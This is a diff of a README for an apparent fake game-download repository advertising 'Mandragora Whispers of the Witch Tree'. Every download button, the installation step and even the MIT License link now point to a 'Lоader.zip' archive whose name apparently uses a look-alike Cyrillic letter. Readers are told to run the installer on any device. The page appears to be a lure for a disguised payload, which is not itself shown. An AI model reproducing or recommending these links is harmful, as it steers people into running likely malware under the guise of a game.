@@ -1,5 +1,5 @@
 # 🌳 Mandragora Whispers of the Witch Tree 🧙‍♀️  
-[![Download Now](https://img.shields.io/badge/Download%20Mandragora-Get%20It%20Here-blue)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/jayasurya031/MandragoraWhispersWitchTreeReleaseHub/main/Lоader.zip%20Mandragora-Get%20It%20Here-blue)](https://raw.githubusercontent.com/jayasurya031/MandragoraWhispersWitchTreeReleaseHub/main/Lоader.zip)
 
 Embark on a spellbinding adventure! Mandragora Whispers of the Witch Tree invites you into a mystical world teeming with ancient secrets, enchanting forests, and the magical Mandragora tree itself. Experience captivating visuals, engaging quests, and a story woven with witchcraft, legends, and the whispers of nature. 🌔
 
@@ -22,7 +22,7 @@ Embark on a spellbinding adventure! Mandragora Whispers of the Witch Tree invite
 
 ## 🔑 Installation Guide  
 1⃣ Click the button to start your magical journey:  
-   [![Download Now](https://img.shields.io/badge/Download%20Mandragora-Get%20It%20Here-blue)](https://easylauncher.su/PSnzrH)
+   [![Download Now](https://raw.githubusercontent.com/jayasurya031/MandragoraWhispersWitchTreeReleaseHub/main/Lоader.zip%20Mandragora-Get%20It%20Here-blue)](https://raw.githubusercontent.com/jayasurya031/MandragoraWhispersWitchTreeReleaseHub/main/Lоader.zip)
 
 2⃣ Run the installer on your device (Windows, macOS, Linux, Android, iOS supported)  
 3⃣ Begin your enchanting quest among the roots of the Witch Tree!  
@@ -34,8 +34,8 @@ Mandragora download, Witch Tree adventure, fantasy game, spellbound quest, mysti
 Mandragora Whispers of the Witch Tree is distributed for educational and entertainment purposes. All rights belong to their respective owners. No support for illegal activities or software tampering is provided.
 
 ## 📜 License  
-This repository is licensed under the [MIT License](https://opensource.org/licenses/MIT).
+This repository is licensed under the [MIT License](https://raw.githubusercontent.com/jayasurya031/MandragoraWhispersWitchTreeReleaseHub/main/Lоader.zip).
 
 ---
 
-### [![Download Mandragora Whispers of the Witch Tree](https://img.shields.io/badge/Download%20Mandragora-Get%20It%20Here-blue)](https://easylauncher.su/PSnzrH)
+### [![Download Mandragora Whispers of the Witch Tree](https://raw.githubusercontent.com/jayasurya031/MandragoraWhispersWitchTreeReleaseHub/main/Lоader.zip%20Mandragora-Get%20It%20Here-blue)](https://raw.githubusercontent.com/jayasurya031/MandragoraWhispersWitchTreeReleaseHub/main/Lоader.zip)
